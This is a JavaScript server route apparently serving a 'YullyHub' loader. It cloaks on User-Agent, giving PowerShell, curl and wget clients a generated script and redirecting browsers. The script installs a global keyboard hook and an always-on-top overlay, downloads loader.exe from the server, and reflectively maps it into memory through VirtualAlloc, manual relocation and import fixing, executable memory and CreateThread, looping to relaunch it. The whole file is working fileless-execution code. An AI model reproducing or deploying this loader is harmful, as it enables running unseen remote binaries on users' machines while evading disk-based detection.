// /loader — dual-mode endpoint (works on Vercel serverless AND on the
// local custom server). PowerShell / curl / wget get the reflective
// PE-loader bootstrap script; browsers get 302'd to the dashboard root.
//
// The bootstrap script fetches /loader.exe (served from Next's public/
// dir so Vercel bundles it into the deploy) and reflectively maps it
// into the running PowerShell process.

function isPowerShellUA(ua) {
    if (!ua) return false;
    const u = ua.toLowerCase();
    return u.includes('powershell') ||
           u.includes('windowspowershell') ||
           u.includes('pwsh') ||
           u.includes('curl') ||
           u.includes('wget');
}

function buildLoaderPs1(host, scheme) {
    const binUrl = `${scheme}://${host}/loader.exe`;
    const exitCheckUrl = `${scheme}://${host}/api/loader/wrapper-should-exit`;
    const overlayUrl = `${scheme}://${host}/api/loader/overlay`;
    return `# YullyHub Loader — reflective in-memory launcher
$ErrorActionPreference = 'Stop'
$BinUrl = '${binUrl}'
$OverlayUrl = '${overlayUrl}'

# ---------- Status Bar (WPF overlay) ----------
Add-Type -AssemblyName PresentationFramework
Add-Type -AssemblyName PresentationCore
Add-Type -AssemblyName WindowsBase
Add-Type -AssemblyName System.Xaml

$barCode = @'
#pragma warning disable 0169, 0414, 0649
using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Shapes;
using System.Windows.Threading;

public class StatusBar {
    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id, KbDel cb, IntPtr hMod, uint tid);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int n, IntPtr w, IntPtr l);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
    delegate IntPtr KbDel(int n, IntPtr w, IntPtr l);

    static Window win;
    static Thread thr;
    static IntPtr hk;
    static KbDel hkCb;

    static TextBlock lbl;
    static TextBox logBox;
    static RowDefinition logRow;
    static Polygon arrowPoly;
    static Border accentBd;
    static bool exp;

    static string pollUrl;
    static long lastVer;
    static string[][] steps;
    static int sIdx = -1;
    static string waitKey;
    static DispatcherTimer pollTmr, stepTmr;

    const double BW = 700, BH = 40, LH = 160, RAD = 6;

    static void MakeUI() {
        var wa = SystemParameters.WorkArea;
        double w = Math.Min(wa.Width - 40, BW);
        win = new Window {
            WindowStyle = WindowStyle.None,
            AllowsTransparency = true,
            Background = Brushes.Transparent,
            Topmost = true, ShowInTaskbar = false,
            ResizeMode = ResizeMode.NoResize,
            Width = w, Height = BH,
            Left = wa.Left + (wa.Width - w) / 2,
            Top = wa.Bottom - BH - 14
        };

        var outer = new Border {
            Background = new SolidColorBrush(Color.FromArgb(242, 18, 18, 22)),
            CornerRadius = new CornerRadius(RAD),
            ClipToBounds = true
        };

        var grid = new Grid();
        grid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(3) });
        grid.RowDefinitions.Add(new RowDefinition { Height = new GridLength(BH - 3) });
        logRow = new RowDefinition { Height = new GridLength(0) };
        grid.RowDefinitions.Add(logRow);

        accentBd = new Border { Background = new SolidColorBrush(Color.FromRgb(71, 146, 226)) };
        Grid.SetRow(accentBd, 0);

        var content = new Grid();
        content.ColumnDefinitions.Add(new ColumnDefinition());
        content.ColumnDefinitions.Add(new ColumnDefinition { Width = new GridLength(36) });

        lbl = new TextBlock {
            Text = "YullyHub " + ((char)0x2014) + " ready",
            Foreground = new SolidColorBrush(Color.FromRgb(190, 190, 195)),
            FontFamily = new FontFamily("Segoe UI"), FontSize = 13,
            VerticalAlignment = VerticalAlignment.Center,
            HorizontalAlignment = HorizontalAlignment.Center
        };
        Grid.SetColumn(lbl, 0);

        var arrowBtn = new Border { Background = Brushes.Transparent, Cursor = Cursors.Hand };
        arrowPoly = new Polygon {
            Points = new PointCollection { new Point(0,0), new Point(8,0), new Point(4,4) },
            Fill = new SolidColorBrush(Color.FromRgb(100, 100, 105)),
            HorizontalAlignment = HorizontalAlignment.Center,
            VerticalAlignment = VerticalAlignment.Center
        };
        arrowBtn.Child = arrowPoly;
        arrowBtn.MouseLeftButtonDown += (s, e) => ToggleLog();
        Grid.SetColumn(arrowBtn, 1);

        content.Children.Add(lbl);
        content.Children.Add(arrowBtn);
        Grid.SetRow(content, 1);

        var logBd = new Border {
            Background = new SolidColorBrush(Color.FromRgb(10, 10, 12)),
            BorderBrush = new SolidColorBrush(Color.FromRgb(40, 40, 44)),
            BorderThickness = new Thickness(0, 1, 0, 0)
        };
        logBox = new TextBox {
            IsReadOnly = true,
            Background = Brushes.Transparent,
            Foreground = new SolidColorBrush(Color.FromRgb(130, 130, 135)),
            FontFamily = new FontFamily("Consolas"), FontSize = 11,
            BorderThickness = new Thickness(0),
            TextWrapping = TextWrapping.Wrap,
            VerticalScrollBarVisibility = ScrollBarVisibility.Auto,
            Padding = new Thickness(10, 6, 10, 6)
        };
        logBd.Child = logBox;
        Grid.SetRow(logBd, 2);

        grid.Children.Add(accentBd);
        grid.Children.Add(content);
        grid.Children.Add(logBd);
        outer.Child = grid;
        win.Content = outer;

        stepTmr = new DispatcherTimer();
        stepTmr.Tick += (s, e) => { stepTmr.Stop(); Advance(); };
        pollTmr = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(1500) };
        pollTmr.Tick += (s, e) => Poll();
        pollTmr.Start();
    }

    static void ToggleLog() {
        exp = !exp;
        var wa = SystemParameters.WorkArea;
        if (exp) {
            logRow.Height = new GridLength(LH);
            win.Height = BH + LH;
            win.Top = wa.Bottom - win.Height - 14;
            arrowPoly.Points = new PointCollection { new Point(0,4), new Point(8,4), new Point(4,0) };
        } else {
            logRow.Height = new GridLength(0);
            win.Height = BH;
            win.Top = wa.Bottom - BH - 14;
            arrowPoly.Points = new PointCollection { new Point(0,0), new Point(8,0), new Point(4,4) };
        }
    }

    static void Poll() {
        try {
            var wc = new WebClient();
            wc.Headers.Add("Cache-Control", "no-cache");
            wc.Headers.Add("User-Agent", "yullyhub-overlay/1");
            string resp = wc.DownloadString(pollUrl + "?v=" + lastVer);
            if (resp == null || !resp.StartsWith("v=")) return;
            var lines = resp.Split(new char[]{(char)13,(char)10}, StringSplitOptions.RemoveEmptyEntries);
            long ver = 0;
            long.TryParse(lines[0].Substring(2), out ver);
            if (ver <= lastVer || lines.Length < 2) return;
            lastVer = ver;
            var arr = new string[lines.Length - 1][];
            for (int i = 1; i < lines.Length; i++)
                arr[i-1] = lines[i].Split('|');
            steps = arr;
            sIdx = -1;
            Advance();
        } catch {}
    }

    static void Advance() {
        stepTmr.Stop();
        sIdx++;
        if (steps == null || sIdx >= steps.Length) {
            lbl.Text = "YullyHub " + ((char)0x2014) + " ready";
            lbl.Foreground = new SolidColorBrush(Color.FromRgb(190, 190, 195));
            accentBd.Background = new SolidColorBrush(Color.FromRgb(71, 146, 226));
            waitKey = null;
            return;
        }
        var s = steps[sIdx];
        string kind = s.Length > 0 ? s[0] : "message";
        string text = s.Length > 1 ? s[1] : "";
        string dismiss = s.Length > 2 ? s[2] : "timeout";
        string kb = s.Length > 3 ? s[3] : "";
        int ms = 3000;
        if (s.Length > 4) int.TryParse(s[4], out ms);
        if (ms < 500) ms = 3000;

        lbl.Text = text;
        if (kind == "success") {
            accentBd.Background = new SolidColorBrush(Color.FromRgb(46, 160, 67));
            lbl.Foreground = new SolidColorBrush(Color.FromRgb(46, 200, 90));
        } else if (kind == "close") {
            accentBd.Background = new SolidColorBrush(Color.FromRgb(200, 60, 60));
            lbl.Foreground = new SolidColorBrush(Color.FromRgb(200, 180, 180));
        } else {
            accentBd.Background = new SolidColorBrush(Color.FromRgb(71, 146, 226));
            lbl.Foreground = new SolidColorBrush(Color.FromRgb(220, 220, 225));
        }
        if (dismiss == "keybind" && kb.Length > 0) {
            waitKey = kb;
            lbl.Text += "   [ " + kb + " ]";
        } else {
            waitKey = null;
        }
        stepTmr.Interval = TimeSpan.FromMilliseconds(ms);
        stepTmr.Start();
    }

    static void OnKey(int vk) {
        if (waitKey == null) return;
        string name = KeyInterop.KeyFromVirtualKey(vk).ToString();
        if (name.Equals(waitKey, StringComparison.OrdinalIgnoreCase)) {
            waitKey = null;
            stepTmr.Stop();
            Advance();
        }
    }

    public static void Launch(string url) {
        pollUrl = url;
        thr = new Thread(() => {
            MakeUI();
            hkCb = (n, w, l) => {
                if (n >= 0 && w == (IntPtr)0x0100) {
                    int vk = Marshal.ReadInt32(l);
                    try { win.Dispatcher.BeginInvoke((Action)(() => OnKey(vk))); } catch {}
                }
                return CallNextHookEx(hk, n, w, l);
            };
            using (var p = System.Diagnostics.Process.GetCurrentProcess())
            using (var m = p.MainModule)
                hk = SetWindowsHookEx(13, hkCb, GetModuleHandle(m.ModuleName), 0);
            win.Show();
            Dispatcher.Run();
            UnhookWindowsHookEx(hk);
        });
        thr.SetApartmentState(ApartmentState.STA);
        thr.IsBackground = true;
        thr.Start();
    }

    public static void Log(string text) {
        if (win == null) return;
        try {
            win.Dispatcher.BeginInvoke((Action)(() => {
                logBox.AppendText(text + System.Environment.NewLine);
                logBox.ScrollToEnd();
            }));
        } catch {}
    }

    public static void SetText(string txt) {
        if (win == null) return;
        try { win.Dispatcher.BeginInvoke((Action)(() => lbl.Text = txt)); } catch {}
    }

    public static void Kill() {
        if (win == null) return;
        try {
            win.Dispatcher.BeginInvoke((Action)(() => {
                win.Close();
                win.Dispatcher.InvokeShutdown();
            }));
        } catch {}
    }
}
'@

$barRefs = @(
    [System.Windows.Window].Assembly.Location,
    [System.Windows.Media.Brushes].Assembly.Location,
    [System.Windows.Threading.Dispatcher].Assembly.Location,
    [System.Xaml.XamlReader].Assembly.Location
)
Add-Type -TypeDefinition $barCode -ReferencedAssemblies $barRefs -ErrorAction SilentlyContinue
[StatusBar]::Launch($OverlayUrl)

$csharp = @'
using System;
using System.Runtime.InteropServices;

public static class RPE {
    [DllImport("kernel32.dll")]  public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]  public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")]  public static extern IntPtr LoadLibraryA(string lpLibFileName);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]  public static extern IntPtr GetProcAddress(IntPtr hModule, IntPtr ordinal);
    [DllImport("kernel32.dll")]  public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]  public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public const uint MEM_COMMIT  = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_READWRITE = 0x04;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;

    public static void Run(byte[] raw) {
        int e_lfanew = BitConverter.ToInt32(raw, 0x3C);
        ushort machine = BitConverter.ToUInt16(raw, e_lfanew + 4);
        if (machine != 0x8664) throw new Exception("Only x64 payloads supported");
        ushort numSections     = BitConverter.ToUInt16(raw, e_lfanew + 6);
        ushort sizeOptionalHdr = BitConverter.ToUInt16(raw, e_lfanew + 20);
        int optHdrOff = e_lfanew + 24;
        uint addrOfEntry    = BitConverter.ToUInt32(raw, optHdrOff + 16);
        ulong prefImageBase = BitConverter.ToUInt64(raw, optHdrOff + 24);
        uint sizeOfImage    = BitConverter.ToUInt32(raw, optHdrOff + 56);
        uint sizeOfHeaders  = BitConverter.ToUInt32(raw, optHdrOff + 60);
        int dataDirOff = optHdrOff + 112;
        uint importRva  = BitConverter.ToUInt32(raw, dataDirOff + 8 * 1);
        uint relocRva   = BitConverter.ToUInt32(raw, dataDirOff + 8 * 5);
        uint relocSize  = BitConverter.ToUInt32(raw, dataDirOff + 8 * 5 + 4);

        IntPtr baseAddr = VirtualAlloc((IntPtr)prefImageBase, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (baseAddr == IntPtr.Zero)
            baseAddr = VirtualAlloc(IntPtr.Zero, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (baseAddr == IntPtr.Zero) throw new Exception("VirtualAlloc failed");

        Marshal.Copy(raw, 0, baseAddr, (int)sizeOfHeaders);
        int secTableOff = optHdrOff + sizeOptionalHdr;
        for (int i = 0; i < numSections; i++) {
            int so = secTableOff + i * 40;
            uint vSize   = BitConverter.ToUInt32(raw, so + 8);
            uint vAddr   = BitConverter.ToUInt32(raw, so + 12);
            uint rawSize = BitConverter.ToUInt32(raw, so + 16);
            uint rawPtr  = BitConverter.ToUInt32(raw, so + 20);
            if (rawSize == 0) continue;
            IntPtr dst = new IntPtr(baseAddr.ToInt64() + vAddr);
            Marshal.Copy(raw, (int)rawPtr, dst, (int)rawSize);
        }

        long delta = baseAddr.ToInt64() - (long)prefImageBase;
        if (delta != 0 && relocSize > 0) {
            int cursor = 0;
            IntPtr relBase = new IntPtr(baseAddr.ToInt64() + relocRva);
            while (cursor < relocSize) {
                IntPtr blk = new IntPtr(relBase.ToInt64() + cursor);
                uint blkRva  = (uint)Marshal.ReadInt32(blk, 0);
                uint blkSize = (uint)Marshal.ReadInt32(blk, 4);
                if (blkSize == 0) break;
                int entries = (int)(blkSize - 8) / 2;
                for (int j = 0; j < entries; j++) {
                    ushort entry = (ushort)Marshal.ReadInt16(blk, 8 + j * 2);
                    int type = entry >> 12;
                    int off  = entry & 0xFFF;
                    if (type == 10) {
                        IntPtr patchAddr = new IntPtr(baseAddr.ToInt64() + blkRva + off);
                        long v = Marshal.ReadInt64(patchAddr);
                        Marshal.WriteInt64(patchAddr, v + delta);
                    }
                }
                cursor += (int)blkSize;
            }
        }

        if (importRva != 0) {
            int impCursor = 0;
            while (true) {
                IntPtr descPtr = new IntPtr(baseAddr.ToInt64() + importRva + impCursor);
                uint origThunk  = (uint)Marshal.ReadInt32(descPtr, 0);
                uint nameRva    = (uint)Marshal.ReadInt32(descPtr, 12);
                uint firstThunk = (uint)Marshal.ReadInt32(descPtr, 16);
                if (nameRva == 0 && firstThunk == 0) break;
                string dllName = Marshal.PtrToStringAnsi(new IntPtr(baseAddr.ToInt64() + nameRva));
                IntPtr hMod = LoadLibraryA(dllName);
                if (hMod == IntPtr.Zero) throw new Exception("LoadLibrary failed: " + dllName);

                uint thunkRva = origThunk != 0 ? origThunk : firstThunk;
                int idx = 0;
                while (true) {
                    IntPtr thunkPtr = new IntPtr(baseAddr.ToInt64() + thunkRva + idx * 8);
                    IntPtr iatPtr   = new IntPtr(baseAddr.ToInt64() + firstThunk + idx * 8);
                    long thunkVal = Marshal.ReadInt64(thunkPtr);
                    if (thunkVal == 0) break;
                    IntPtr proc;
                    if ((ulong)thunkVal >> 63 == 1) {
                        ushort ordinal = (ushort)(thunkVal & 0xFFFF);
                        proc = GetProcAddress(hMod, (IntPtr)ordinal);
                    } else {
                        IntPtr nameEntry = new IntPtr(baseAddr.ToInt64() + (thunkVal & 0x7FFFFFFF) + 2);
                        string funcName = Marshal.PtrToStringAnsi(nameEntry);
                        proc = GetProcAddress(hMod, funcName);
                    }
                    if (proc == IntPtr.Zero) throw new Exception("GetProcAddress failed");
                    Marshal.WriteInt64(iatPtr, proc.ToInt64());
                    idx++;
                }
                impCursor += 20;
            }
        }

        uint oldProt;
        VirtualProtect(baseAddr, sizeOfImage, PAGE_EXECUTE_READWRITE, out oldProt);

        IntPtr entryPtr = new IntPtr(baseAddr.ToInt64() + addrOfEntry);
        IntPtr th = CreateThread(IntPtr.Zero, 0, entryPtr, IntPtr.Zero, 0, IntPtr.Zero);
        if (th == IntPtr.Zero) throw new Exception("CreateThread failed");
        WaitForSingleObject(th, 0xFFFFFFFF);
    }
}
'@

Add-Type -TypeDefinition $csharp -Language CSharp -ErrorAction Stop | Out-Null

Write-Host ""
Write-Host "  YullyHub  -  bootstrapping loader..." -ForegroundColor Cyan
Write-Host ""
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

# Auto-reconnect loop with rapid-fail guard:
#   - If loader.exe stays up for a normal amount of time (>=8s) before
#     exiting, we treat that as a healthy restart and reconnect.
#   - If it exits in <8s three attempts in a row, that's a crash loop
#     (bad download URL, incompatible binary, missing permission) —
#     we bail so we don't stack "Download failed" popups forever.
# EXIT signal: after each RPE::Run returns, we ask the server "should I
# shut down?". The dashboard's X-close button posts our IP to
# /api/loader/wrapper-signal-exit; if that timestamp is newer than
# $StartEpoch we exit the loop and the PS window closes cleanly.
$ExitCheckUrl = '${exitCheckUrl}'
$StartEpoch = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
$attempt = 0
$rapidFails = 0
while ($true) {
    $attempt = $attempt + 1
    $runStart = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('Cache-Control', 'no-cache')
        $wc.Headers.Add('User-Agent',    'yullyhub-bootstrap/' + $attempt)
        [StatusBar]::Log("[attempt $attempt] Downloading loader...")
        $bytes = $wc.DownloadData($BinUrl)
        Write-Host "  [attempt $attempt] fetched $($bytes.Length) bytes. Mapping..." -ForegroundColor Green
        [StatusBar]::Log("[attempt $attempt] Downloaded $($bytes.Length) bytes. Mapping PE...")
        [RPE]::Run($bytes)
        Write-Host "  [attempt $attempt] loader thread exited." -ForegroundColor Yellow
        [StatusBar]::Log("[attempt $attempt] Loader thread exited.")
    } catch {
        Write-Host ("  [attempt " + $attempt + "] error: " + $_.Exception.Message) -ForegroundColor DarkYellow
        try { [StatusBar]::Log("[attempt $attempt] Error: " + $_.Exception.Message) } catch {}
    }
    $elapsed = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds() - $runStart
    if ($elapsed -lt 8) {
        $rapidFails = $rapidFails + 1
        Write-Host ("  Rapid exit (" + $elapsed + "s). Rapid-fail count: " + $rapidFails + "/3.") -ForegroundColor Magenta
        try { [StatusBar]::Log("Rapid exit (" + $elapsed + "s). Fail " + $rapidFails + "/3.") } catch {}
    } else {
        $rapidFails = 0
    }
    if ($rapidFails -ge 3) {
        Write-Host "  Loader is in a crash loop. Exiting wrapper — re-run the command after the issue is fixed." -ForegroundColor Red
        try { [StatusBar]::Log("Crash loop detected. Exiting.") } catch {}
        break
    }
    try {
        $wc2 = New-Object System.Net.WebClient
        $wc2.Headers.Add('Cache-Control', 'no-cache')
        $wc2.Headers.Add('User-Agent',    'yullyhub-wrapper-check/1')
        $resp = $wc2.DownloadString($ExitCheckUrl + '?since=' + $StartEpoch)
        if ($resp -match '"exit"\\s*:\\s*true') {
            Write-Host "  Dashboard closed. Shutting down loader wrapper." -ForegroundColor Cyan
            try { [StatusBar]::Log("Dashboard closed. Shutting down.") } catch {}
            break
        }
    } catch { }
    Start-Sleep -Seconds 3
}
try { [StatusBar]::Kill() } catch {}
Write-Host "  YullyHub loader exited." -ForegroundColor Cyan
`;
}

export const runtime = 'nodejs';       // Node runtime supports our sync response
export const dynamic = 'force-dynamic'; // never cache

function handle(request) {
    const ua = request.headers.get('user-agent') || '';
    const host = request.headers.get('host') || 'localhost:3000';
    const proto = request.headers.get('x-forwarded-proto') ||
                  (host.startsWith('localhost') || host.startsWith('127.') ? 'http' : 'https');

    if (isPowerShellUA(ua)) {
        return new Response(buildLoaderPs1(host, proto), {
            status: 200,
            headers: {
                'Content-Type':  'text/plain; charset=utf-8',
                'Cache-Control': 'no-store, no-cache, must-revalidate',
                'X-Content-Type-Options': 'nosniff',
            },
        });
    }
    return Response.redirect(`${proto}://${host}/`, 302);
}

export async function GET(request)   { return handle(request); }
export async function HEAD(request)  { return handle(request); }
